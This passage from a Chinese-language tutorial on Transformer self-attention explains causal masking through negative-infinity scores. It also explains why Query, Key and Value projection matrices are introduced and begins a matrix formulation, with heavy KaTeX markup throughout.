<li>计算  <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">y_{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>  (对应 <code>“Love”</code>) 时，只允许关注 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>x</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">x_{1},x_{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span></li>
<li>计算  <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mn>3</mn></msub></mrow><annotation encoding="application/x-tex">y_{3}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>  (对应 <code>“Apple”</code>) 时，才允许关注全部 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>x</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>x</mi><mn>3</mn></msub></mrow><annotation encoding="application/x-tex">x_{1},x_{2},x_{3}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span></li>
</ul>
<p>如何实现这种屏蔽？很简单，没有你想象的那么复杂，保持之前所有的算法步骤不变，你想屏蔽谁，就把谁的<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord mathnormal">p</span></span></span></span></span>置为负无穷，这样它在经过softmax后，对应的<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi></mrow><annotation encoding="application/x-tex">q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span></span>自然就变成0了。</p>
<hr/>
<p>建议你将前面的自注意力计算过程亲手推导一遍。这种“笨功夫”能帮你建立起扎实的直觉——当你亲手用数字演算过注意力如何流动后，对后续抽象概念的理解会清晰得多。如果你已经完全掌握了上一部分，那么恭喜你，你已经非常接近Transformer的核心了。接下来我们更进一步。</p>
<p>还是上面的例子，让我们仔细观察这个流程图。你会发现，同一个词嵌入向量需要同时承担三种不同的角色：
第一，作为<strong>查询者</strong>（蓝色部分），它要主动去“询问”自己与其他向量的关系；
第二，作为<strong>被查询者</strong>（橙色部分），它被动地接受其他向量的“询问”，并提供比较的依据；
第三，作为<strong>输出内容</strong>（紫色部分），它最终要参与加权求和，构成新表示的一部分。</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/164707cfe9f145eca60699aa6a290280~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766470318&amp;x-signature=UEHAbc1Ve3ihLSmKD%2BSXegmN3Ec%3D" alt="c7.jpg" width="100%" loading="lazy"/></p>
<p>让一个向量同时完成这三项任务，就像让一位演员在同一幕戏中分饰三个角色——虽然可能做到，却难免顾此失彼、表达受限。在计算意义上，这种“身兼数职”会导致向量维度被迫承载多种相互冲突的语义信息，从而降低模型的表达效率与灵活性。</p>
<p>于是很自然地，我们想到一个改进方案：<strong>将原来单一的向量拆分成三个独立的向量，让它们各司其职</strong>。如何拆分呢？我们引入三个可训练的权重矩阵 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>W</mi><mi>q</mi></msub></mrow><annotation encoding="application/x-tex">W_q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span>、<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>W</mi><mi>k</mi></msub></mrow><annotation encoding="application/x-tex">W_k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> 与 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>W</mi><mi>v</mi></msub></mrow><annotation encoding="application/x-tex">W_v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>，分别用于生成<strong>查询向量（Query）、键向量（Key）与值向量（Value）</strong>：</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msubsup><mi>x</mi><mi>i</mi><mi>k</mi></msubsup><mo>=</mo><msub><mi>x</mi><mi>i</mi></msub><mo>⋅</mo><msub><mi>W</mi><mi>k</mi></msub><mspace linebreak="newline"/><msubsup><mi>x</mi><mi>i</mi><mi>q</mi></msubsup><mo>=</mo><msub><mi>x</mi><mi>i</mi></msub><mo>⋅</mo><msub><mi>W</mi><mi>q</mi></msub><mspace linebreak="newline"/><msubsup><mi>x</mi><mi>i</mi><mi>v</mi></msubsup><mo>=</mo><msub><mi>x</mi><mi>i</mi></msub><mo>⋅</mo><msub><mi>W</mi><mi>v</mi></msub></mrow><annotation encoding="application/x-tex">x_{i}^{k} = x_{i} \cdot W_{k}
\\ x_{i}^{q} = x_{i} \cdot W_{q}
\\ x_{i}^{v} = x_{i} \cdot W_{v}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1461em;vertical-align:-0.247em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8991em;"><span style="top:-2.453em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.5945em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span><span class="mspace newline"/><span class="base"><span class="strut" style="height:1.0592em;vertical-align:-0.2769em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7823em;"><span style="top:-2.4231em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span style="top:-3.1809em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2769em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.5945em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span><span class="mspace newline"/><span class="base"><span class="strut" style="height:0.9614em;vertical-align:-0.247em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7144em;"><span style="top:-2.453em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.5945em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span></div>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/48888eb7d02f43c988913cdd9ed2d710~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766470318&amp;x-signature=%2FZMojg4rM6jmQbazwcDxEWJcFtA%3D" alt="c8.jpg" width="100%" loading="lazy"/></p>
<p>这样一来，每个词向量通过三个不同的线性变换，演化出三个分工明确的“化身”：</p>
<ul>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>x</mi><mi>i</mi><mi>q</mi></msubsup></mrow><annotation encoding="application/x-tex">x_i^q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0592em;vertical-align:-0.2769em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7823em;"><span style="top:-2.4231em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.1809em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2769em;"><span/></span></span></span></span></span></span></span></span></span> 专注于表达“我想关注什么”，</li>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>x</mi><mi>i</mi><mi>k</mi></msubsup></mrow><annotation encoding="application/x-tex">x_i^k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1078em;vertical-align:-0.2587em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-2.4413em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2587em;"><span/></span></span></span></span></span></span></span></span></span> 专注于表达“我能提供什么特征用于被匹配”，</li>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>x</mi><mi>i</mi><mi>v</mi></msubsup></mrow><annotation encoding="application/x-tex">x_i^v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9231em;vertical-align:-0.2587em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.4413em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2587em;"><span/></span></span></span></span></span></span></span></span></span> 则纯粹承载“我本身的实际内容”。</li>
</ul>
<p>后续的注意力计算流程与之前完全一致，只是将原先的 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">x_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> 替换为对应的 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi><mo separator="true">,</mo><mi>k</mi><mo separator="true">,</mo><mi>v</mi></mrow><annotation encoding="application/x-tex">q, k, v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span></span>：</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/89bab2de19204c1bb276eabda0a23c9d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766470318&amp;x-signature=G5IPUzBek5b120E9Dsadwbc79JA%3D" alt="c9.jpg" width="100%" loading="lazy"/></p>
<p><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>W</mi><mi>q</mi></msub><mo separator="true">,</mo><msub><mi>W</mi><mi>k</mi></msub><mo separator="true">,</mo><msub><mi>W</mi><mi>v</mi></msub></mrow><annotation encoding="application/x-tex">W_q, W_k, W_v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> 作为可训练的参数，使得模型能够通过数据自动学习到<strong>最适合当前任务的注意力模式</strong>。相比之前固定使用原始向量进行点积的“硬编码”方式，这种可学习的拆分机制极大增强了模型的表达能力。</p>
<p>从语义分工的角度来看，这种设计赋予模型更细腻的注意力调控能力，QKV根据自己不同的职责，表达不同的语义信息，这样模型自然而然就会有更强的表达能力。</p>
<ul>
<li><strong>Query</strong> 体现了一种“主动性”，相当于在问：“我现在需要什么样的信息”</li>
<li><strong>Key</strong> 体现了一种“应答性”，相当于在回答：“我这里有这样的特征”</li>
<li><strong>Value</strong> 则是真正被传递的实质内容，匹配成功后贡献到输出中。</li>
</ul>
<p>各环节专业分工，整个系统才能高效运转、灵活适应复杂任务。<strong>这正印证了亚当·斯密的那句话：分工是提高效率的源泉。</strong> 在注意力机制中，Query、Key、Value的明确职责划分与专业化，便是模型智能得以涌现的效率之源。</p>
<hr/>
<p>接下来，让我们从<strong>矩阵的视角</strong>重新审视并实现上述的注意力计算过程。如果使用循环逐个处理上述流程，虽然很直观，但在实际计算的时候会非常低效。而将这些操作转化为矩阵运算，不仅能让表达更加简洁，更重要的是能够充分利用现代硬件（尤其是GPU）强大的<strong>并行计算能力</strong>，实现极致的加速。</p>
<p><strong>注意：下面的计算过程有点绕，推荐自己拿笔在草稿纸上自己推一篇，尤其是要注意每个矩阵的形状</strong></p>
<p>我们首先将整个序列形式化。假设序列长度为 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">seq\_len</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0044em;vertical-align:-0.31em;"/><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span></span></span></span></span>，每个词的特征维度为 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mi>m</mi><mi>b</mi><mi>e</mi><mi>d</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">embed\_size</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0044em;vertical-align:-0.31em;"/><span class="mord mathnormal">e</span><span class="mord mathnormal">mb</span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span></span></span></span></span>，那么整个输入序列很自然地可以表示为一个形状为 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><mi>n</mi><mo separator="true">,</mo><mi>e</mi><mi>m</mi><mi>b</mi><mi>e</mi><mi>d</mi><mi 